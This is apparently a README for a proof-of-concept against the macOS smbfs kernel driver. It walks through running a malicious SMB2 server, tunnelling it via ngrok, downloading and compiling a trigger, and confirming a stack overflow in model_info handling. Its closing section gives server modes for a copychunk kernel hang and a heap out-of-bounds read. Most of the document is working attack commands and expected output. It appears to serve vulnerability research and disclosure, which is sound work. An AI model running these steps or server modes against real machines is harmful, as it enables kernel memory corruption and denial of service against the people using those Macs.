============================================================================
 XNU smbfs model-info overflow - live trigger (Finding 2)
 Repo: https://github.com/anomvar/GiantKiller
============================================================================

Bug: smb_dev.c:492  memcpy(properties->model_info, vcp->vc_model_info,
     strlen(vcp->vc_model_info)) into char model_info[510]. The model string
     is server-controlled (AAPL create context, up to ~2.2 KB after UTF-16 ->
     UTF-8 NFD expansion). This overflows the ioctl caller's stack.

Files here:
  evil_smb_server.py     - malicious SMB2 server (run on the Linux box)
  smbfs_model_trigger.c  - live trigger (compile and run on the Mac)

----------------------------------------------------------------------------
 STEP 1 - SERVER (on the Linux box)
----------------------------------------------------------------------------
# needs: python3 + impacket
pip3 install --break-system-packages impacket

# run the malicious server in AAPL model-info mode:
python3 evil_smb_server.py --listen 0.0.0.0 --port 445 --output-count 32 --aapl-model

# expose port 445 to the internet (so the Mac can reach it):
ngrok tcp 445

# NOTE: ngrok prints a hostname like 0.tcp.in.ngrok.io - use it below.
# The server console should show:
#   [*] MODE: AAPL model-info create context (Finding 2)
#   WARNING:root:[EVIL] AAPL model-info create-context injection ENABLED (...)

----------------------------------------------------------------------------
 STEP 2 - MAC: download the trigger
----------------------------------------------------------------------------
curl -L -o smbfs_model_trigger.c \
  "https://raw.githubusercontent.com/anomvar/GiantKiller/main/smbfs_model_trigger.c?nocache=$(date +%s)"

# verify it is current (must be 7 'errno=' prints):
grep -c 'errno=%d' smbfs_model_trigger.c   # -> 7

----------------------------------------------------------------------------
 STEP 3 - MAC: check SDK headers (preferred build)
----------------------------------------------------------------------------
ls "$(xcrun --show-sdk-path)/usr/include/netsmb/" 2>/dev/null

# If you see smb_dev.h and smb_dev_2.h, build with the real kernel structs:
cc -O1 -o smbfs_model_trigger smbfs_model_trigger.c \
   -DUSE_SYSTEM_SMB_HEADERS -isysroot "$(xcrun --show-sdk-path)"

# If the headers are NOT there, build with the built-in struct layouts:
cc -O1 -o smbfs_model_trigger smbfs_model_trigger.c

----------------------------------------------------------------------------
 STEP 4 - MAC: run
----------------------------------------------------------------------------
# <NGROK_HOST> is the hostname ngrok gave you, e.g. 0.tcp.in.ngrok.io
./smbfs_model_trigger <NGROK_HOST> share hello.txt

Expected good output:
  [*] opened nsmb fd 3
  [*] NEGOTIATE ret=0 errno=0 ...
  [*] SSNSETUP ret=0 errno=0 ...
  [*] TCON ret=0 errno=0 ...
  [*] CREATE ret=0 errno=0 ntstatus=0
  [*] VC_PROPERTIES ret=0 ... returned_model_len=762
  [!!!] OVERFLOW CONFIRMED: stack guard after model_info overwritten ...

That last line means smb_dev.c:492 wrote past the 510-byte model_info field
into the ioctl caller's stack (strlen ~762, i.e. >= 510). Finding 2 verified.

For an even cleaner crash demo, compile with:
  cc -O1 -fstack-protector-strong -o smbfs_model_trigger smbfs_model_trigger.c ...
then the overflow trips the stack canary -> SIGABRT + a crash report showing
__stack_chk_fail.

----------------------------------------------------------------------------
 TROUBLESHOOTING
----------------------------------------------------------------------------
NEGOTIATE errno=19 (Operation not supported by device):
  ioctl cmd/size mismatch -> use the -DUSE_SYSTEM_SMB_HEADERS build (SDK
  headers give the exact kernel struct sizes).

NEGOTIATE errno=60/61/64 (timeout/refused/host down):
  the Mac cannot reach the server on :445 -> check ngrok + the server console.

NEGOTIATE errno=22 (Invalid argument): SMB_IOC_STRUCT_VERSION mismatch.

Server console shows no incoming connection when the trigger runs:
  tunnel is not forwarding; fix ngrok.

Repeated "COPYCHUNK SourceKey = ..." lines on the server:
  that is a stuck Finder copy from the --dos-copychunk test; unmount the
  share / restart Finder on the Mac, and run the server with --aapl-model.

----------------------------------------------------------------------------
 OTHER SERVER MODES (for the other findings)
----------------------------------------------------------------------------
# Finding 3 - copychunk infinite loop / kernel hang (DoS):
python3 evil_smb_server.py --listen 0.0.0.0 --port 445 --output-count 32 --dos-copychunk
# then on the Mac: Finder Duplicate hello.txt -> the copy hangs, server floods
# with "[EVIL] COPYCHUNK #N -> SUCCESS chunks=16 total=0". Ctrl-C the server to
# unstick the Mac.

# Finding 1 - resume-key heap OOB read (needs an UNPATCHED macOS build;
# current macOS rejects OutputCount < 24):
python3 evil_smb_server.py --listen 0.0.0.0 --port 445 --output-count 16
============================================================================